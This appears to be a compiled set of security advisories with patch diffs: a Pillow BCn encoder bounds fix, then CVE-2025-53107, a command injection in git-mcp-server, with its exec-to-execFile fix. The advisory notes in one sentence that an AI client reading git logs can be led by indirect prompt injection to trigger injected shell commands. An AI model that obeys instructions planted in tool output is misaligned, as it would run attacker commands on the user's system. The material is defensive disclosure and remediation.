     with pytest.raises(OSError, match="only RGB mode can be written as BC5"):
         im.save(out, pixel_format="BC5")
+
+
+@pytest.mark.parametrize(
+    "pixel_format, mode",
+    (
+        ("DXT1", "RGBA"),
+        ("DXT3", "RGBA"),
+        ("DXT5", "RGBA"),
+        ("BC2", "RGBA"),
+        ("BC3", "RGBA"),
+        ("BC5", "RGB"),
+    ),
+)
+def test_save_large_file(tmp_path: Path, pixel_format: str, mode: str) -> None:
+    im = hopper(mode).resize((440, 440))
+    # should not error in valgrind
+    im.save(tmp_path / "img.dds", pixel_format=pixel_format)
diff --git a/src/libImaging/BcnEncode.c b/src/libImaging/BcnEncode.c
index 2bad73b9261..7a5072ddee6 100644
--- a/src/libImaging/BcnEncode.c
+++ b/src/libImaging/BcnEncode.c
@@ -258,6 +258,10 @@ ImagingBcnEncode(Imaging im, ImagingCodecState state, UINT8 *buf, int bytes) {
     UINT8 *dst = buf;
 
     for (;;) {
+        // Loop writes a max of 16 bytes per iteration
+        if (dst + 16 >= bytes + buf) {
+            break;
+        }
         if (n == 5) {
             encode_bc3_alpha(im, state, dst, 0);
             dst += 8;


================================================================================


CVE ID: CVE-2025-53107
Published: 2025-07-01T18:15:25.990
Modified: 2025-07-03T15:14:12.767
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

Description:
@cyanheads/git-mcp-server is an MCP server designed to interact with Git repositories. Prior to version 2.1.5, there is a command injection vulnerability caused by the unsanitized use of input parameters within a call to child_process.exec, enabling an attacker to inject arbitrary system commands. Successful exploitation can lead to remote code execution under the server process's privileges. The server constructs and executes shell commands using unvalidated user input directly within command-line strings. This introduces the possibility of shell metacharacter injection (|, >, &&, etc.). An MCP Client can be instructed to execute additional actions for example via indirect prompt injection when asked to read git logs. This issue has been patched in version 2.1.5.

References (3):
  1. https://github.com/cyanheads/git-mcp-server/commit/0dbd6995ccdf76ab770b58013034365b2d06c4d9
  2. https://github.com/cyanheads/git-mcp-server/releases/tag/v2.1.5
  3. https://github.com/cyanheads/git-mcp-server/security/advisories/GHSA-3q26-f695-pp76

Attempting to extract code examples from references...

--- Code from https://github.com/cyanheads/git-mcp-server/commit/0dbd6995ccdf76ab770b58013034365b2d06c4d9 ---
From 0dbd6995ccdf76ab770b58013034365b2d06c4d9 Mon Sep 17 00:00:00 2001
From: cyanheads <casey@caseyjhand.com>
Date: Sun, 29 Jun 2025 04:44:41 -0700
Subject: [PATCH] fix(security): patch command injection vulnerability

Replaced all instances of `child_process.exec` with `child_process.execFile` to prevent shell metacharacter injection. This ensures that user-provided input is treated as arguments rather than being executed as part of a shell command, mitigating the risk of remote code execution.

This addresses the vulnerability disclosed in GHSA-3q26-f695-pp76.

Special thanks to @dellalibera for the responsible disclosure.
---
 CHANGELOG.md                                  |    5 +
 package-lock.json                             | 2362 +----------------
 package.json                                  |   15 +-
 src/mcp-server/tools/gitAdd/logic.ts          |   78 +-
 src/mcp-server/tools/gitBranch/logic.ts       |   68 +-
 src/mcp-server/tools/gitCheckout/logic.ts     |   32 +-
 src/mcp-server/tools/gitCherryPick/logic.ts   |   33 +-
 src/mcp-server/tools/gitClean/logic.ts        |   19 +-
 src/mcp-server/tools/gitClone/logic.ts        |   26 +-
 src/mcp-server/tools/gitCommit/logic.ts       |  101 +-
 src/mcp-server/tools/gitDiff/logic.ts         |   62 +-
 src/mcp-server/tools/gitFetch/logic.ts        |   26 +-
 src/mcp-server/tools/gitInit/logic.ts         |   21 +-
 src/mcp-server/tools/gitLog/logic.ts          |   46 +-
 src/mcp-server/tools/gitMerge/logic.ts        |   27 +-
 src/mcp-server/tools/gitPull/logic.ts         |   27 +-
 src/mcp-server/tools/gitPush/logic.ts         |   42 +-
 src/mcp-server/tools/gitRebase/logic.ts       |   45 +-
 src/mcp-server/tools/gitRemote/logic.ts       |   30 +-
 src/mcp-server/tools/gitReset/logic.ts        |   22 +-
 .../tools/gitSetWorkingDir/logic.ts           |   18 +-
 src/mcp-server/tools/gitShow/logic.ts         |   17 +-
 src/mcp-server/tools/gitStash/logic.ts        |   33 +-
 src/mcp-server/tools/gitStatus/logic.ts       |   18 +-
 src/mcp-server/tools/gitTag/logic.ts          |   30 +-
 src/mcp-server/tools/gitWorktree/logic.ts     |   87 +-
 26 files changed, 519 insertions(+), 2771 deletions(-)

diff --git a/CHANGELOG.md b/CHANGELOG.md
index 1a6c4f2..d8bfc7a 100644
--- a/CHANGELOG.md
+++ b/CHANGELOG.md
@@ -2,6 +2,11 @@
 
 All notable changes to this project will be documented in this file.
 
+## v2.1.5 - 2025-06-29
+
+### Security
+- Patched a command injection vulnerability where unsanitized user input could be passed to `child_process.exec`. All `exec` calls have been replaced with the safer `execFile` method, which treats arguments as distinct values rather than executable script parts. Thank you to [@dellalibera](https://github.com/dellalibera) for the disclosure. For more details, see the security advisory: [GHSA-3q26-f695-pp76](https://github.com/cyanheads/git-mcp-server/security/advisories/GHSA-3q26-f695-pp76).
+
 ## v2.1.4 - 2025-06-20
 
 ### Changed
diff --git a/package-lock.json b/package-lock.json
index fb739cb..be2a8ee 100644
--- a/package-lock.json
+++ b/package-lock.json
@@ -1,12 +1,12 @@
 {
   "name": "@cyanheads/git-mcp-server",
-  "version": "2.1.3",
+  "version": "2.1.5",
   "lockfileVersion": 3,
   "requires": true,
   "packages": {
     "": {
       "name": "@cyanheads/git-mcp-server",
-      "version": "2.1.3",
+      "version": "2.1.5",
       "funding": [
         {
           "type": "github",
@@ -20,21 +20,14 @@
       "license": "Apache-2.0",
       "dependencies": {
         "@hono/node-server": "^1.14.4",
-        "@modelcontextprotocol/inspector": "^0.14.3",
         "@modelcontextprotocol/sdk": "^1.13.0",
-        "@types/jsonwebtoken": "^9.0.10",
         "@types/node": "^24.0.3",
         "@types/sanitize-html": "^2.16.0",
         "@types/validator": "^13.15.2",
-        "chalk": "^5.4.1",
         "chrono-node": "2.8.0",
-        "cli-table3": "^0.6.5",
         "dotenv": "^16.5.0",
-        "express": "^5.1.0",
         "hono": "^4.8.2",
-        "ignore": "^7.0.5",
         "jose": "^6.0.11",
-        "jsonwebtoken": "^9.0.2",
         "openai": "^5.6.0",
         "partial-json": "^0.1.7",
         "sanitize-html": "^2.17.0",
@@ -43,17 +36,13 @@
         "typescript": "^5.8.3",
         "validator": "^13.15.15",
         "winston": "^3.17.0",
-        "winston-daily-rotate-file": "^5.0.0",
-        "yargs": "^18.0.0",
+        "winston-transport": "^4.7.0",
         "zod": "^3.25.67"
       },
       "bin": {
         "git-mcp-server": "dist/index.js"
       },
       "devDependencies": {
-        "@types/express": "^5.0.3",
-        "@types/js-yaml": "^4.0.9",
-        "js-yaml": "^4.1.0",
         "prettier": "^3.5.3",
         "typedoc": "^0.28.5"
       },
@@ -93,44 +82,6 @@
         "kuler": "^2.0.0"
       }
     },
-    "node_modules/@floating-ui/core": {
-      "version": "1.7.1",
-      "resolved": "https://registry.npmjs.org/@floating-ui/core/-/core-1.7.1.tgz",
-      "integrity": "sha512-azI0DrjMMfIug/ExbBaeDVJXcY0a7EPvPjb2xAJPa4HeimBX+Z18HK8QQR3jb6356SnDDdxx+hinMLcJEDdOjw==",
-      "license": "MIT",
-      "dependencies": {
-        "@floating-ui/utils": "^0.2.9"
-      }
-    },
-    "node_modules/@floating-ui/dom": {
-      "version": "1.7.1",
-      "resolved": "https://registry.npmjs.org/@floating-ui/dom/-/dom-1.7.1.tgz",
-      "integrity": "sha512-cwsmW/zyw5ltYTUeeYJ60CnQuPqmGwuGVhG9w0PRaRKkAyi38BT5CKrpIbb+jtahSwUl04cWzSx9ZOIxeS6RsQ==",
-      "license": "MIT",
-      "dependencies": {
-        "@floating-ui/core": "^1.7.1",
-        "@floating-ui/utils": "^0.2.9"
-      }
-    },
-    "node_modules/@floating-ui/react-dom": {
-      "version": "2.1.3",
-      "resolved": "https://registry.npmjs.org/@floating-ui/react-dom/-/react-dom-2.1.3.tgz",
-      "integrity": "sha512-huMBfiU9UnQ2oBwIhgzyIiSpVgvlDstU8CX0AF+wS+KzmYMs0J2a3GwuFHV1Lz+jlrQGeC1fF+Nv0QoumyV0bA==",
-      "license": "MIT",
-      "dependencies": {
-        "@floating-ui/dom": "^1.0.0"
-      },
-      "peerDependencies": {
-        "react": ">=16.8.0",
-        "react-dom": ">=16.8.0"
-      }
-    },
-    "node_modules/@floating-ui/utils": {
-      "version": "0.2.9",
-      "resolved": "https://registry.npmjs.org/@floating-ui/utils/-/utils-0.2.9.tgz",
-      "integrity": "sha512-MDWhGtE+eHw5JW7lq4qhc5yRLS11ERl1c7Z6Xd0a58DozHES6EnNNwUWbMiG4J9Cgj053Bhk8zvlhFYKVhULwg==",
-      "license": "MIT"
-    },
     "node_modules/@gerrit0/mini-shiki": {
       "version": "3.6.0",
       "resolved": "https://registry.npmjs.org/@gerrit0/mini-shiki/-/mini-shiki-3.6.0.tgz",
@@ -182,98 +133,6 @@
         "@jridgewell/sourcemap-codec": "^1.4.10"
       }
     },
-    "node_modules/@modelcontextprotocol/inspector": {
-      "version": "0.14.3",
-      "resolved": "https://registry.npmjs.org/@modelcontextprotocol/inspector/-/inspector-0.14.3.tgz",
-      "integrity": "sha512-WtEDqVwXnICveGd39BOF0Q3WxCPQg3MhBzMEDDZp2AZn+pO+eTiRR4bqxTiGkqHUjHODckHkSpu2FQ/A+x5mnQ==",
-      "license": "MIT",
-      "workspaces": [
-        "client",
-        "server",
-        "cli"
-      ],
-      "dependencies": {
-        "@modelcontextprotocol/inspector-cli": "^0.14.3",
-        "@modelcontextprotocol/inspector-client": "^0.14.3",
-        "@modelcontextprotocol/inspector-server": "^0.14.3",
-        "@modelcontextprotocol/sdk": "^1.12.1",
-        "concurrently": "^9.0.1",
-        "open": "^10.1.0",
-        "shell-quote": "^1.8.2",
-        "spawn-rx": "^5.1.2",
-        "ts-node": "^10.9.2",
-        "zod": "^3.23.8"
-      },
-      "bin": {
-        "mcp-inspector": "cli/build/cli.js"
-      }
-    },
-    "node_modules/@modelcontextprotocol/inspector-cli": {
-      "version": "0.14.3",
-      "resolved": "https://registry.npmjs.org/@modelcontextprotocol/inspector-cli/-/inspector-cli-0.14.3.tgz",
-      "integrity": "sha512-cAjCfwJUfN1WHc/sGgY/yAQ7K02WOKIso+LzVoKzEr50Nf4R+WKEuq6lhnLfG3f61sU823V8TxRscc8NTYTgww==",
-      "license": "MIT",
-      "dependencies": {
-        "@modelcontextprotocol/sdk": "^1.12.1",
-        "commander": "^13.1.0",
-        "spawn-rx": "^5.1.2"
-      },
-      "bin": {
-        "mcp-inspector-cli": "build/cli.js"
-      }
-    },
-    "node_modules/@modelcontextprotocol/inspector-client": {
-      "version": "0.14.3",
-      "resolved": "https://registry.npmjs.org/@modelcontextprotocol/inspector-client/-/inspector-client-0.14.3.tgz",
-      "integrity": "sha512-kbpUYzImbB3VOolyzASfmz08m6kDQvFC0iYv4bF/ZZiwJHaqAPi/i/BIZSrpfRGbAnH+ECqjeRsxRjD6S8pr+g==",
-      "license": "MIT",
-      "dependencies": {
-        "@modelcontextprotocol/sdk": "^1.12.1",
-        "@radix-ui/react-checkbox": "^1.1.4",
-        "@radix-ui/react-dialog": "^1.1.3",
-        "@radix-ui/react-icons": "^1.3.0",
-        "@radix-ui/react-label": "^2.1.0",
-        "@radix-ui/react-popover": "^1.1.3",
-        "@radix-ui/react-select": "^2.1.2",
-        "@radix-ui/react-slot": "^1.1.0",
-        "@radix-ui/react-tabs": "^1.1.1",
-        "@radix-ui/react-toast": "^1.2.6",
-        "@radix-ui/react-tooltip": "^1.1.8",
-        "ajv": "^6.12.6",
-        "class-variance-authority": "^0.7.0",
-        "clsx": "^2.1.1",
-        "cmdk": "^1.0.4",
-        "lucide-react": "^0.447.0",
-        "pkce-challenge": "^4.1.0",
-        "prismjs": "^1.30.0",
-        "react": "^18.3.1",
-        "react-dom": "^18.3.1",
-        "react-simple-code-editor": "^0.14.1",
-        "serve-handler": "^6.1.6",
-        "tailwind-merge": "^2.5.3",
-        "tailwindcss-animate": "^1.0.7",
-        "zod": "^3.23.8"
-      },
-      "bin": {
-        "mcp-inspector-client": "bin/start.js"
-      }
-    },
-    "node_modules/@modelcontextprotocol/inspector-server": {
-      "version": "0.14.3",
-      "resolved": "https://registry.npmjs.org/@modelcontextprotocol/inspector-server/-/inspector-server-0.14.3.tgz",
-      "integrity": "sha512-nstKV26OUHj0Dh4S+M44JsU8UGfCrxfChmczR3GZ1658t6cBLBvw2EeqUgQa4BJ0X/KbDdIgZMX0oYKEE1hYcA==",
-      "license": "MIT",
-      "dependencies": {
-        "@modelcontextprotocol/sdk": "^1.12.1",
-        "cors": "^2.8.5",
-        "express": "^5.1.0",
-        "ws": "^8.18.0",
-        "zod": "^3.23.8"
-      },
-      "bin": {
-        "mcp-inspector-server": "build/index.js"
-      }
-    },
     "node_modules/@modelcontextprotocol/sdk": {
       "version": "1.13.0",
       "resolved": "https://registry.npmjs.org/@modelcontextprotocol/sdk/-/sdk-1.13.0.tgz",
@@ -305,790 +164,6 @@
         "node": ">=16.20.0"
       }
     },
-    "node_modules/@radix-ui/number": {
-      "version": "1.1.1",
-      "resolved": "https://registry.npmjs.org/@radix-ui/number/-/number-1.1.1.tgz",
-      "integrity": "sha512-MkKCwxlXTgz6CFoJx3pCwn07GKp36+aZyu/u2Ln2VrA5DcdyCZkASEDBTd8x5whTQQL5CiYf4prXKLcgQdv29g==",
-      "license": "MIT"
-    },
-    "node_modules/@radix-ui/primitive": {
-      "version": "1.1.2",
-      "resolved": "https://registry.npmjs.org/@radix-ui/primitive/-/primitive-1.1.2.tgz",
-      "integrity": "sha512-XnbHrrprsNqZKQhStrSwgRUQzoCI1glLzdw79xiZPoofhGICeZRSQ3dIxAKH1gb3OHfNf4d6f+vAv3kil2eggA==",
-      "license": "MIT"
-    },
-    "node_modules/@radix-ui/react-arrow": {
-      "version": "1.1.7",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-arrow/-/react-arrow-1.1.7.tgz",
-      "integrity": "sha512-F+M1tLhO+mlQaOWspE8Wstg+z6PwxwRd8oQ8IXceWz92kfAmalTRf0EjrouQeo7QssEPfCn05B4Ihs1K9WQ/7w==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-primitive": "2.1.3"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-checkbox": {
-      "version": "1.3.2",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-checkbox/-/react-checkbox-1.3.2.tgz",
-      "integrity": "sha512-yd+dI56KZqawxKZrJ31eENUwqc1QSqg4OZ15rybGjF2ZNwMO+wCyHzAVLRp9qoYJf7kYy0YpZ2b0JCzJ42HZpA==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/primitive": "1.1.2",
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-context": "1.1.2",
-        "@radix-ui/react-presence": "1.1.4",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-use-controllable-state": "1.2.2",
-        "@radix-ui/react-use-previous": "1.1.1",
-        "@radix-ui/react-use-size": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-collection": {
-      "version": "1.1.7",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-collection/-/react-collection-1.1.7.tgz",
-      "integrity": "sha512-Fh9rGN0MoI4ZFUNyfFVNU4y9LUz93u9/0K+yLgA2bwRojxM8JU1DyvvMBabnZPBgMWREAJvU2jjVzq+LrFUglw==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-context": "1.1.2",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-slot": "1.2.3"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-compose-refs": {
-      "version": "1.1.2",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-compose-refs/-/react-compose-refs-1.1.2.tgz",
-      "integrity": "sha512-z4eqJvfiNnFMHIIvXP3CY57y2WJs5g2v3X0zm9mEJkrkNv4rDxu+sg9Jh8EkXyeqBkB7SOcboo9dMVqhyrACIg==",
-      "license": "MIT",
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-context": {
-      "version": "1.1.2",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-context/-/react-context-1.1.2.tgz",
-      "integrity": "sha512-jCi/QKUM2r1Ju5a3J64TH2A5SpKAgh0LpknyqdQ4m6DCV0xJ2HG1xARRwNGPQfi1SLdLWZ1OJz6F4OMBBNiGJA==",
-      "license": "MIT",
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-dialog": {
-      "version": "1.1.14",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-dialog/-/react-dialog-1.1.14.tgz",
-      "integrity": "sha512-+CpweKjqpzTmwRwcYECQcNYbI8V9VSQt0SNFKeEBLgfucbsLssU6Ppq7wUdNXEGb573bMjFhVjKVll8rmV6zMw==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/primitive": "1.1.2",
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-context": "1.1.2",
-        "@radix-ui/react-dismissable-layer": "1.1.10",
-        "@radix-ui/react-focus-guards": "1.1.2",
-        "@radix-ui/react-focus-scope": "1.1.7",
-        "@radix-ui/react-id": "1.1.1",
-        "@radix-ui/react-portal": "1.1.9",
-        "@radix-ui/react-presence": "1.1.4",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-slot": "1.2.3",
-        "@radix-ui/react-use-controllable-state": "1.2.2",
-        "aria-hidden": "^1.2.4",
-        "react-remove-scroll": "^2.6.3"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-direction": {
-      "version": "1.1.1",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-direction/-/react-direction-1.1.1.tgz",
-      "integrity": "sha512-1UEWRX6jnOA2y4H5WczZ44gOOjTEmlqv1uNW4GAJEO5+bauCBhv8snY65Iw5/VOS/ghKN9gr2KjnLKxrsvoMVw==",
-      "license": "MIT",
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-dismissable-layer": {
-      "version": "1.1.10",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-dismissable-layer/-/react-dismissable-layer-1.1.10.tgz",
-      "integrity": "sha512-IM1zzRV4W3HtVgftdQiiOmA0AdJlCtMLe00FXaHwgt3rAnNsIyDqshvkIW3hj/iu5hu8ERP7KIYki6NkqDxAwQ==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/primitive": "1.1.2",
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-use-callback-ref": "1.1.1",
-        "@radix-ui/react-use-escape-keydown": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-focus-guards": {
-      "version": "1.1.2",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-focus-guards/-/react-focus-guards-1.1.2.tgz",
-      "integrity": "sha512-fyjAACV62oPV925xFCrH8DR5xWhg9KYtJT4s3u54jxp+L/hbpTY2kIeEFFbFe+a/HCE94zGQMZLIpVTPVZDhaA==",
-      "license": "MIT",
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-focus-scope": {
-      "version": "1.1.7",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-focus-scope/-/react-focus-scope-1.1.7.tgz",
-      "integrity": "sha512-t2ODlkXBQyn7jkl6TNaw/MtVEVvIGelJDCG41Okq/KwUsJBwQ4XVZsHAVUkK4mBv3ewiAS3PGuUWuY2BoK4ZUw==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-use-callback-ref": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-icons": {
-      "version": "1.3.2",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-icons/-/react-icons-1.3.2.tgz",
-      "integrity": "sha512-fyQIhGDhzfc9pK2kH6Pl9c4BDJGfMkPqkyIgYDthyNYoNg3wVhoJMMh19WS4Up/1KMPFVpNsT2q3WmXn2N1m6g==",
-      "license": "MIT",
-      "peerDependencies": {
-        "react": "^16.x || ^17.x || ^18.x || ^19.0.0 || ^19.0.0-rc"
-      }
-    },
-    "node_modules/@radix-ui/react-id": {
-      "version": "1.1.1",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-id/-/react-id-1.1.1.tgz",
-      "integrity": "sha512-kGkGegYIdQsOb4XjsfM97rXsiHaBwco+hFI66oO4s9LU+PLAC5oJ7khdOVFxkhsmlbpUqDAvXw11CluXP+jkHg==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-use-layout-effect": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-label": {
-      "version": "2.1.7",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-label/-/react-label-2.1.7.tgz",
-      "integrity": "sha512-YT1GqPSL8kJn20djelMX7/cTRp/Y9w5IZHvfxQTVHrOqa2yMl7i/UfMqKRU5V7mEyKTrUVgJXhNQPVCG8PBLoQ==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-primitive": "2.1.3"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-popover": {
-      "version": "1.1.14",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-popover/-/react-popover-1.1.14.tgz",
-      "integrity": "sha512-ODz16+1iIbGUfFEfKx2HTPKizg2MN39uIOV8MXeHnmdd3i/N9Wt7vU46wbHsqA0xoaQyXVcs0KIlBdOA2Y95bw==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/primitive": "1.1.2",
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-context": "1.1.2",
-        "@radix-ui/react-dismissable-layer": "1.1.10",
-        "@radix-ui/react-focus-guards": "1.1.2",
-        "@radix-ui/react-focus-scope": "1.1.7",
-        "@radix-ui/react-id": "1.1.1",
-        "@radix-ui/react-popper": "1.2.7",
-        "@radix-ui/react-portal": "1.1.9",
-        "@radix-ui/react-presence": "1.1.4",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-slot": "1.2.3",
-        "@radix-ui/react-use-controllable-state": "1.2.2",
-        "aria-hidden": "^1.2.4",
-        "react-remove-scroll": "^2.6.3"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-popper": {
-      "version": "1.2.7",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-popper/-/react-popper-1.2.7.tgz",
-      "integrity": "sha512-IUFAccz1JyKcf/RjB552PlWwxjeCJB8/4KxT7EhBHOJM+mN7LdW+B3kacJXILm32xawcMMjb2i0cIZpo+f9kiQ==",
-      "license": "MIT",
-      "dependencies": {
-        "@floating-ui/react-dom": "^2.0.0",
-        "@radix-ui/react-arrow": "1.1.7",
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-context": "1.1.2",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-use-callback-ref": "1.1.1",
-        "@radix-ui/react-use-layout-effect": "1.1.1",
-        "@radix-ui/react-use-rect": "1.1.1",
-        "@radix-ui/react-use-size": "1.1.1",
-        "@radix-ui/rect": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-portal": {
-      "version": "1.1.9",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-portal/-/react-portal-1.1.9.tgz",
-      "integrity": "sha512-bpIxvq03if6UNwXZ+HTK71JLh4APvnXntDc6XOX8UVq4XQOVl7lwok0AvIl+b8zgCw3fSaVTZMpAPPagXbKmHQ==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-use-layout-effect": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-presence": {
-      "version": "1.1.4",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-presence/-/react-presence-1.1.4.tgz",
-      "integrity": "sha512-ueDqRbdc4/bkaQT3GIpLQssRlFgWaL/U2z/S31qRwwLWoxHLgry3SIfCwhxeQNbirEUXFa+lq3RL3oBYXtcmIA==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-use-layout-effect": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
